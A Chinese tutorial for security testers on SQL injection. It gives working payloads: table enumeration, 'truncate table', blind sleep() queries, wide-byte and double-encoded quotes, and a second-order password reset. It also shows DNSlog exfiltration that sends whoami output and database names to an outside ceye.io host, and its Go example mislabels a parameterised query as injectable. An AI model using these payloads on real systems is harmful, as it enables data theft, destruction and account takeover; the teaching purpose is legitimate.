# 安全测试之-SQL注入


## 什么是`SQL`注入

在没有对没有对输入参数进行校验的情况下，请求方可以向参数中添加一些影响SQL的字符，导致程序直接用请求者传入的参数去数据库查询，会导致原有的SQL被修改，不能按预期返回

## `SQL`注入示例

比如一个查询接口，查询指定时间段内的数据

```sql
SELECT
	* 
FROM
	STAPP 
WHERE
	TC_OD_OPT_DT > '2020-11-16 15:05:01'
	AND TC_OD_OPT_DT < '2020-11-18 15:05:01'
	LIMIT 0,30;
```

如果没有对输入参数做校验，前端传入了截断字符串的参数，那`SQL`就变成了下面这样

```mysql
SELECT
	* 
FROM
	STAPP 
WHERE
	TC_OD_OPT_DT > '2000-11-16 15:05:01'
	AND TC_OD_OPT_DT < '2020-11-18 15:05:01';#') LIMIT 0,30;
```

上面的查询直接查询了很长一段时间范围内的数据，如果数据量非常大的话，会对数据库造成较大压力

或者

```mysql
SELECT
	* 
FROM
	STAPP 
WHERE
	TC_OD_OPT_DT > '2000-11-16 15:05:01'
	AND TC_OD_OPT_DT < '2020-11-18 15:05:01';
select table_name from information_schema.tables;#') LIMIT 0,30;
```

上面的操作就获取到了所有表名称

如果业务登录的用户权限够大的话，然后就可以这样

```mysql
SELECT
	* 
FROM
	STAPP 
WHERE
	TC_OD_OPT_DT > '2000-11-16 15:05:01'
	AND TC_OD_OPT_DT < '2020-11-18 15:05:01';
truncate table STAPP;#') LIMIT 0,30;
```

上面的操作会清空整张`STAPP`表

## 注入点

- 文本框注入
  
  - 常见的用户名文本输入框，密码文本输入框，查询文本输入框
  
- `url`注入

  - 针对连接后面的参数进行测试，比如在网站上点击一篇文章，网站前端会把文章的ID放到`url`中发送`GET`请求到服务端

    如：`https://www.jianshu.com/p/178ca3ddc866`，可以对最后面的文章id进行注入测试

- 工具

  - `spider`：可以获取到一个网址的所有链接
  - `sqlmap`：开源渗透测试工具，能自动检测利用`SQL`注入缺陷并接管数据库服务器
  
  `sqlmap`使用方法：
  
  - `sqlmap -u "url"`：检测注入点，`url`中必须有例如`id=123`类似的参数
  - `sqlmap -l`：从`Burpsuite proxy`或`WebScarab proxy`中读取`http`请求日志文件
  - `sqlmap -x`：从`sitemap.xml`站点地图文件中读取目标检测
  - `sqlmap -m`：从多行文本格式文件读取多个目标，对多个目标进行探测
  - `sqlmap -r`：从`Burp suite`保存的文本文件中读取`http`请求作为注入探测的目标
  - `sqlmap -c`：从配置文件`sqlmap.conf`中读取目标探测 

## 注入方法

### 布尔盲注

- 可以进行注入，但是不能通过注入直接拿到数据库中的数据

```go
func SelectUser(db *sql.DB, name string) bool {
	rows, err := db.Query(`SELECT u."name" FROM "user" u WHERE u."name" = $1`,name)
	ifErr(err)
	user := User{}
    for rows.Next() {
		err := rows.Scan(&user.Name)
		ifErr(err)
        if user.Name == ""{
			return false
        }else {
            return true
        }
	}
}
```

如果上面代码中的`db.Query`方法没有对传入的`name`参数做校验的话，那么该程序是存在注入漏洞的

虽然没有返回查询数据与错误信息，但是返回了查询结果

如果正常查询操作，会返回正常的结果

```
SelectUser(db,"test")//查询到test则返回true，否则返回false
```

如果传入一个非法参数，如下所示

```
SelectUser(db,"test'")
```

上面传入的`name`参数为`test`的值存在，当在后面输入一个截断的单引号时，该`sql`会执行失败，会返回`false`

这样就成功的测试出了该参数是存在注入漏洞的

通过这个漏洞可以对请求参数后添加一些其他的语句，对请求的内容做出判断，如果返回`true`那么我们的判断则是正确的，否则是错误的

### 时间盲注

- 当存在注入漏洞的查询接口，无论有没有查询到数据，都返回相同的值时，可以构造`sql`语句，通过相应时间来判断盲注的成功与否

- 示例：

  - 编写逻辑`sql`，通过条件语句进行判断，为真则立即执行，否则延时执行。语法为：

  ```mysql
  if(left(user(),1)='a',0,sleep(3));
  ```

  如果`left(user(),1)='a'`判断为真，则返回0，如果判断为假，则执行`sleep(3)`



### `mysql`中盲注的一些方法

- `left()`函数：

```mysql
select left(database(),1) = 's'
```

`database`显示数据库名称，`left`函数从左截取数据库名称的前N位

- `regexp`

```mysql
select user() regexp '^r'
```

正则表达式的用法，与`left()`用法相似，也是从左往右匹配，当匹配成功时则返回1

- `substr`函数：用来截取字符串

```mysql
SELECT SUBSTR((SELECT DATABASE()),1，1) //截取查询结果的第一位
```

- `ascii`函数：可以将字符串转换为`ascii`码值，该方法可以避免单引号的出现，能适用于更多的场景

```mysql
select ascii(SUBSTR((SELECT database()),1,1))
```

- 通过以上方法可以进行盲注测试

### `DnsLog`盲注

- 当程序存在注入漏洞，但是既不会返回查询结果，又不会返回错误信息时，可以通过布尔盲注和时间盲注通过猜测注入的方式获取到数据，但是这个过程效率很低，要发起很多请求。
- 所以需要一种方式，减少请求，直接返回查询结果，这里可以使用`DnsLog`实现注入

#### `DnsLog`盲注原理

- `DNS`在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息

- `DNS`的日志信息

  - ```
    curl xx.r4ourp.ceye.io
    ```

    | 记录信息     | 详情                      | 地址        | 方式 | user-agent |
    | ------------ | ------------------------- | ----------- | ---- | ---------- |
    | HTTP Request | http://xx.r5ourp.ceye.io/ | 10.10.10.10 | GET  | curl/7.3.0 |
    | DNS Query    | xx.r5ourp.ceye.io         | 10.10.10.10 |      |            |

  - ```
    curl `whoami`.r4ourp.ceye.io
    ```

    | 记录信息     | 详情                        | 地址        | 方式 | user-agent |
    | ------------ | --------------------------- | ----------- | ---- | ---------- |
    | HTTP Request | http://test.r5ourp.ceye.io/ | 10.10.10.10 | GET  | curl/7.3.0 |
    | DNS Query    | test.r5ourp.ceye.io         | 10.10.10.10 |      |            |

    上面使用反引号包起来的`whoami`被拿到服务器的终端去执行了，然后返回的结果放到了`whoami`的位置

    白话就是，被反引号包起来的被当做命令拿到服务器的终端去执行了，返回的结果被记录到了`DNS`的日志信息里面

- `mysql`的`load_file()`

  - 在`mysql`中，`load_file`函数可以发起请求，可以利用该函数发起请求，使用`DnsLog`接收请求，获取数据
  - 语法：`SELECT LOAD_FILE(CONCAT('\\\',(SELECT DATABASE()),'.MYSQL.r4ourp.ceye.io\\abc'));`
    - 通过SQL语句查询内容，作为请求的一部分，发送至`DnsLog`
    - 只要对这部分的语句进行构造，就能实现有回显的注入
    - 但是对数据格式和内容有限制，只能写入指定的内容

### 宽字节注入

#### 什么是宽字节

- 长度为一个字节的字符是窄字节，长度是两个字节的字符为窄字节

- 当程序对入参做过简单判断时，比如说将单引号转义成`\'`，而当`mysql`在使用`GBK`编码时，会认为两个字符为一个汉字

  | 输入 | 处理    | 编码      | 转义 | SQL        |
  | ---- | ------- | --------- | ---- | ---------- |
  | %df' | `%df\'` | %df%5C%27 | 運'  | id=運' and |

  这样就可以成功注入了

### 二次编码注入

- 当经过多次编码后的参数仍不符合要求是，即可造成`sql`注入
- 例如：`id=1%2527`
  - 1.上面的id参数值在PHP自身编码中会被识别为`1%27`
  - 2.然后对`1%27`进行非法字符的转义，因为没有非法字符，所以直接跳过
  - 3.此时如果程序中编写的代码对参数进行了转换的话，`1%27`就变成了1'
  - 此时1'被传入到数据库中是可以将`sql`截断的

### 二次注入

#### 原理

- 1.在传入的参数中插入恶意字符，比如单引号，程序传输过程中对单引号进行了转义，但入库时仍会把原有数据入库
- 2.将数据存入到了数据库中之后，程序就认为该数据是安全的，下一次需要进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检查和处理，这样就会造成二次注入

#### 例子

假如该系统的数据库为`mysql`

- 1.先注册一个用户，用户名为`admin`

- 2.再注册一个用户，用户名为`admin'#`

- 3.然后修改`admin'#`用户的密码

  当修改`admin'#`的时候就会产生SQL注入：

  ```mysql
  update users set passwd = 'newPassword' where username = 'admin'#' and passwd = 'oldPassword'
  ```

  可以看到上面的sql如果没有对`admin'#`做校验的话，那么就会成功注入，最终执行的sql为

  ```mysql
  update users set passwd = 'newPassword' where username = 'admin'
  ```

  这样就成功的把admin用户的密码修改掉了

- 如果没有对用户名的入参做校验的话，甚至可以在用户名后输入一些sql语句来获取数据库的一些信息，或者进行删除操作

- 这种场景会有很多，不只是只有登录场景存在，所以测试时要考虑的足够全面






































